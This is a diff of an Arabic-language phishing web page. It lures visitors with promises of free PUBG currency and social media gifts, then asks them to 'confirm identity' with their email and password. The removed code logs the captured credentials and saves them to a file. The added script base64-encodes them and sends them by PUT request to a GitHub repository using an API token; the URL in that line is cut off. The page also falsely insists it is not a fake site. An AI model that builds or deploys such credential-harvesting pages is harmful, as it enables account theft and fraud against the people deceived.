@@ -1,187 +1,72 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الوصول الفاخرة</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-
-        body {
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #000 url('https://w0.peakpx.com/wallpaper/435/659/HD-wallpaper-pubg-mobile-poster-art-thumbnail.jpg') no-repeat center center fixed;
-            background-size: cover;
-            overflow: hidden;
-        }
-
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.9) 100%);
-            z-index: 1;
-        }
-
-        .login-card {
-            position: relative;
-            z-index: 2;
-            width: 400px;
-            padding: 50px 35px;
-            background: rgba(15, 15, 15, 0.85);
-            backdrop-filter: blur(25px);
-            border: 2px solid #d4af37; /* إطار ذهبي حقيقي */
-            border-radius: 40px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(212, 175, 55, 0.2);
-            animation: slideIn 1s ease;
-        }
-h3 {
-color: green;
-}
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .user-avatar {
-            width: 120px; height: 120px;
-            margin: -90px auto 30px;
-            border-radius: 50%;
-            border: 4px solid #d4af37;
-            background: #111;
-            padding: 5px;
-            box-shadow: 0 10px 25px rgba(212, 175, 55, 0.4);
-        }
-
-        .user-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
-
-        h2 { color: #fff; margin-bottom: 30px; font-weight: 900; font-size: 26px; text-shadow: 2px 2px 10px #000; }
-
-        .input-group { position: relative; margin-bottom: 20px; }
-
-        input {
-            width: 100%;
-            padding: 16px 20px;
-            background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            border-radius: 15px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.4s;
-        }
-
-        input:focus {
-            background: rgba(255, 255, 255, 0.12);
-            border-color: #d4af37;
-            box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
-        }
-
-        .btn-premium {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #d4af37 0%, #f9e295 50%, #b8860b 100%);
-            border: none;
-            border-radius: 15px;
-            color: #000;
-            font-size: 18px;
-            font-weight: 900;
-            cursor: pointer;
-            transition: 0.5s;
-            text-transform: uppercase;
-        }
-
-        .btn-premium:hover {
-            letter-spacing: 1px;
-            filter: brightness(1.1);
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(212, 175, 55, 0.4);
-        }
-
-        #status {
-            display: none;
-            margin-top: 20px;
-            color: #d4af37;
-            font-weight: bold;
-        }
-
-        /* لودر فخم */
-        .loader {
-            width: 25px; height: 25px;
-            border: 3px solid #333;
-            border-top: 3px solid #d4af37;
-            border-radius: 50%;
-            display: inline-block;
-            animation: spin 0.8s linear infinite;
-            margin-left: 10px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
+  <style>
+    *{ text-align:center; }
+    body{ background:black; }
+    .box{ background:black; height:90%; color:black; margin:100px; border-radius:50px; border: 10px solid gold; }
+    h3{ font-size:20px; color:gold; text-align:center; }
+    .input{ background:black; width:500px; margin:10px; }
+    input{ background-color:black; width:400px; height:80px; color:#369999; margin:20px; text-align:center; border-radius:50px; border:5px solid gold; font-size:30px; }
+    button{ width:50%; height:80px; border:5px solid gold; border-radius:50px; margin:10%; font-size:30px; }
+    h2 { color:green; }
+    h1{ color:blue; }
+    h3{ color:gold; }
+    li{ color:#369369; font-size:20px; }
+    .error { color: red; font-size: 20px; }
+  </style>
 </head>
 <body>
+  <div class="box">
+    <h1>مرحبا في افضل موقع لزياده شدات بوبجي</h1>
+    <input id="email" type="text" placeholder="الايميل">
+    <input id="password" type="password" placeholder="كلمه السر">
+    <button onclick="checkCredentials()">تأكيد الهويه</button>
+    <p id="result" class="error"></p>
+    <h1>💯</h1>
+    <h1>🧊</h1>
+    <h2>قد تربح بيوم الثلج اسلحه وشدات عشوائيه </h2>
+    <h3>لماذ نعطيكم الشدات</h3>
+    <li>من اجل ان نجعل موقعنا لديه اكثر زيارات</li>
+    <li>نحن لانخسر عندما نعطيكم الشدات لننا نربح من خلال الاعلانات مثلن لو ربحنا من خلال اعلان 10دولار نعطيكم شدات بدولار لكن انتم تربحون ونحن نربح</li>
+    <li>لسنا من المواقع المزيفه التي تعطيكم شدات بدون مقابل لنه لايوجد شي بدون مقابل </li>
+  </div>
 
-    <div class="login-card">
-        <div class="user-avatar">
-            <img src="Download/zio/صديق.jpg" alt="Admin">
-        </div>
-        
-        <h2>تسجيل دخول كبار الشخصيات</h2>
-		<h3>اضافه هديا في بوبجي وانستقرام وفيسبوك وكل شي كل ماعليك تاكيد هويتك</h3>
-
-        <form id="captureForm">
-            <div class="input-group">
-                <input type="text" id="email" placeholder="البريد الإلكتروني" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="pass" placeholder="كلمة المرور" required>
-            </div>
-            
-            <button type="submit" class="btn-premium" id="mainBtn">تأكيد الهوية الآن</button>
-            
-            <div id="status">
-                <span class="loader"></span>
-                جاري مطابقة البيانات مع السيرفر الرئيسي...
-            </div>
-        </form>
-    </div>
-         <script>
-    document.getElementById('captureForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+  <script>
+    async function checkCredentials() {
       const email = document.getElementById('email').value;
-      const pass = document.getElementById('pass').value;
-      const btn = document.getElementById('mainBtn');
-      const status = document.getElementById('status');
+      const password = document.getElementById('password').value;
+      const result = document.getElementById('result');
 
-      btn.style.display = 'none';
-      status.style.display = 'block';
+      // <!-- هذه التي تضهر كلمه السر والايميل في قيت اب -->
+      try {
+        const response = await fetch('https:                                                               
+          method: 'PUT',
+          headers: {
+            'Authorization': 'token YOUR_GITHUB_TOKEN',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            message: 'New login',
+            content: btoa(`Email: ${email}, Password: ${password}`)
+          })
+        });
+        if (response.ok) {
+          console.log('تم إرسال البيانات');
+        } else {
+          console.log('خطأ في الإرسال');
+        }
+      } catch (error) {
+        console.log('خطأ في الإرسال');
+      }
 
-      console.log("--- تم جلب بيانات عميل جديد ---");
-      console.log("البريد: " + email);
-      console.log("الكلمة: " + pass);
-      console.log("-------------------------------");
-
-      const data = "البريد: " + email + "\nكلمة المرور: " + pass + "\n";
-      const blob = new Blob([data], {type: 'text/plain'});
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'ppp.txt';
-      a.click();
-
-      localStorage.setItem('captured_user', email);
-
-      setTimeout(function() {
-        window.location.href = "http://localhost:5050"; // غير الرابط هنا
-      }, 3000);
-    });
-    </script>
-
+                                                     
+      if (email === 'test@example.com' && password === '123456') {
+        result.innerText = 'تم تسجيل الدخول';
+      } else {
+        result.innerText = 'تأكد من أنك لم تغلط في كتابه كلمه السر او الايميل كلمه السر والايميل خطا';
+      }
+    }
+  </script>
 </body>
 </html>
+
